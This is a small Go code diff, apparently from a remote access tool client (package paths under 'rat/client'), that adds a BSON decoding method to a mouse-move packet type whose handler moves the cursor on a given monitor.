@@ -3,6 +3,8 @@ package main
 import (
 	"rat/client/network/header"
 	"rat/client/screen"
+
+	"github.com/pkg/bson"
 )
 
 type MouseMovePacket struct {
@@ -19,4 +21,9 @@ func (packet MouseMovePacket) OnReceive() error {
 	screen.MoveCursor(packet.MonitorID, packet.X, packet.Y)
 
 	return nil
+}
+
+func (packet MouseMovePacket) Decode(buf []byte) (IncomingPacket, error) {
+	err := bson.Unmarshal(buf, &packet)
+	return packet, err
 }
